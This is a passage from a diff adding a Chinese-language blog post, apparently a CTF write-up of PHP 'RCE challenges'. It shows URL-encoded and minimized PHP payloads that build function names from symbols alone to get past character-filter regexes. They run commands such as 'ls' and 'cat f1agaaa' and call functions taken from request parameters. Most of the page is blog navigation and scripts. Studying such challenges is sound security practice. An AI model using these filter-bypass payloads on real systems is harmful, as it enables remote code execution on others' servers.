class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B(%<span class="number">24</span>___)(%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B&amp;_=ls;cd /;ls;cat f1agaaa;</span><br><span class="line">_=ls;cd /;ls;cat f1agaaa;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/RCE%E6%9E%81%E9%99%90%E6%8C%91%E6%88%98/image-20221122151649639.png" alt="image-20221122151649639"></p>
+<h3 id="RCE挑战3"><a href="#RCE挑战3" class="headerlink" title="RCE挑战3"></a>RCE挑战3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/[a-zA-Z0-<span class="number">9</span>@<span class="comment">#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/</span></span><br><span class="line">/[a-zA-Z2-<span class="number">9</span>!<span class="string">&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/</span></span><br><span class="line"><span class="string">/[a-zA-Z0-9!&#x27;</span>@<span class="comment">#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/</span></span><br><span class="line">$() + , . / ；= _[]</span><br><span class="line"><span class="variable">$_</span>[]=<span class="number">1</span>;<span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>==<span class="number">1</span>];<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$___</span>=<span class="string">&#x27;&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;(<span class="variable">$___</span>)(<span class="variable">$_</span>[_]);</span><br><span class="line">$η.$ν.$η.$θ.$Ω.$α.$λ</span><br><span class="line">缩短变量字母长度</span><br><span class="line">αβγδεζηθ 西塔， ι 约塔， κ 卡帕， λ 兰姆达，μ 米欧 ，ν 纽， ξ 克西， ο 欧米克隆， π 派， ρ 柔 ，σ 西格玛， τ 陶 ，υ 玉普西隆， φ 弗爱， χ 凯， ψ 普赛</span><br><span class="line"><span class="variable">$_</span>=[].[];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">0</span>==<span class="number">1</span>];</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line">$α=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line">$β=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line">$γ=++<span class="variable">$_</span>;</span><br><span class="line">$δ=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line">$ε=++<span class="variable">$_</span>;</span><br><span class="line">$ζ=++<span class="variable">$_</span>;</span><br><span class="line">$η=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line">$θ=++<span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> $α.$β.$γ.$δ.$ε.$ζ.$θ;</span><br><span class="line"><span class="keyword">eval</span></span><br><span class="line">popen</span><br><span class="line">get</span><br><span class="line">exec</span><br><span class="line">strlen长度绕过</span><br></pre></td></tr></table></figure>
+
+<h3 id="WP题解：3-4-5"><a href="#WP题解：3-4-5" class="headerlink" title="WP题解：3-4-5"></a>WP题解：3-4-5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>];<span class="comment">//16</span></span><br><span class="line">$α=++<span class="variable">$_</span>;<span class="comment">//8</span></span><br><span class="line">$β=++<span class="variable">$_</span>;<span class="comment">//8</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;<span class="comment">//10</span></span><br><span class="line">$σ=_.$β.$α.++<span class="variable">$_</span>.++<span class="variable">$_</span>;<span class="comment">//20</span></span><br><span class="line">$$σ[<span class="number">0</span>]($$σ[<span class="number">1</span>]);<span class="comment">//15</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>];$α=++<span class="variable">$_</span>;$β=++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;$σ=_.$β.$α.++<span class="variable">$_</span>.++<span class="variable">$_</span>;$$σ[<span class="number">0</span>]($$σ[<span class="number">1</span>]);<span class="comment">//85</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>];<span class="comment">//16</span></span><br><span class="line">$α=++<span class="variable">$_</span>;<span class="comment">//8</span></span><br><span class="line">$β=++<span class="variable">$_</span>;<span class="comment">//8</span></span><br><span class="line">++<span class="variable">$_</span>;++<span class="variable">$_</span>;<span class="comment">//10</span></span><br><span class="line"><span class="variable">$_</span>=_.$β.$α.++<span class="variable">$_</span>.++<span class="variable">$_</span>;<span class="comment">//20</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);<span class="comment">//15</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>];$α=++<span class="variable">$_</span>;$β=++<span class="variable">$_</span>;++<span class="variable">$_</span>;++<span class="variable">$_</span>;<span class="variable">$_</span>=_.$β.$α.++<span class="variable">$_</span>.++<span class="variable">$_</span>;<span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);<span class="comment">//82</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[a];++<span class="variable">$_</span>;<span class="variable">$a</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;++<span class="variable">$_</span>.++<span class="variable">$_</span>;<span class="variable">$_</span>=_.<span class="variable">$a</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>;<span class="variable">$$_</span>[b](<span class="variable">$$_</span>[_]);</span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D_(%ff%<span class="number">2</span>F%ff)%<span class="number">5</span>B%ff%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%ff%<span class="number">3</span>D%<span class="number">24</span>_.%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_.%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D_.%<span class="number">24</span>%ff.%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_.%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B%fe%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
+
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/web/">#web</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/11/11/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">log4j2漏洞复现</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE%E6%9E%81%E9%99%90%E6%8C%91%E6%88%98"><span class="nav-text">RCE极限挑战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE%E6%8C%91%E6%88%981"><span class="nav-text">RCE挑战1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE%E6%8C%91%E6%88%982"><span class="nav-text">RCE挑战2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE%E6%8C%91%E6%88%983"><span class="nav-text">RCE挑战3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WP%E9%A2%98%E8%A7%A3%EF%BC%9A3-4-5"><span class="nav-text">WP题解：3-4-5</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2022
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">lhb</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
